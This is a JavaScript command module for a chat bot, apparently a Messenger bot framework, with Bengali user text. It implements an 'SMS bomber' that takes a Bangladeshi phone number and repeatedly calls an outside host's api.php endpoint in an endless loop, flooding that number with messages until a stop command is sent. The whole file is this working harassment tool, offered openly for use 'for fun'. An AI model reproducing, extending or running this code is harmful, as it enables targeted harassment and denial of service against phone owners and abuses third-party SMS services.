module.exports = {
  config: {
    name: "sms",
    version: "2.0.0",
    author: "—͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️", // ক্রেডিট চেঞ্জ করলে API বন্ধ হবে
    countDown: 0,
    role: 0,
    shortDescription: "এসএমএস বোম্বার চালু/বন্ধ",
    longDescription: "অনবরত এসএমএস বোম্বার চালাতে বা বন্ধ করতে ব্যবহার করুন",
    category: "tools",
    guide: {
      en: "{pn} 01xxxxxxxxx\n{pn} off"
    }
  },

  onStart: async function ({ message, event, args }) {
    const threadID = event.threadID;
    const number = args[0];
    const axios = require("axios");

    if (!global.smsBombingFlags) global.smsBombingFlags = {};

    if (number === "off") {
      if (global.smsBombingFlags[threadID]) {
        global.smsBombingFlags[threadID] = false;
        return message.reply("✅ SMS বোম্বার বন্ধ করা হয়েছে।");
      } else {
        return message.reply("❗এই থ্রেডে কোন বোম্বিং চলছিল না।");
      }
    }

    if (!/^01[0-9]{9}$/.test(number)) {
      return message.reply(
        "•┄┅════❁🌺❁════┅┄•\n\n☠️••SMS BOMBER BY —͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️💣\n\nব্যবহার:\n/sms 01xxxxxxxxx\n\n(বাংলাদেশি নাম্বার দিন, শুধু মজার জন্য ব্যবহার করুন)\n\n•┄┅════❁🌺❁════┅┄•"
      );
    }

    if (global.smsBombingFlags[threadID]) {
      return message.reply("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /sms off");
    }

    message.reply(`✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে...\nবন্ধ করতে /sms off`);
    global.smsBombingFlags[threadID] = true;

    (async function startBombing() {
      while (global.smsBombingFlags[threadID]) {
        try {
          await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
        } catch (err) {
          message.reply(`❌ ত্রুটি: ${err.message}`);
          global.smsBombingFlags[threadID] = false;
          break;
        }
      }
    })();
  }
};￼Enter
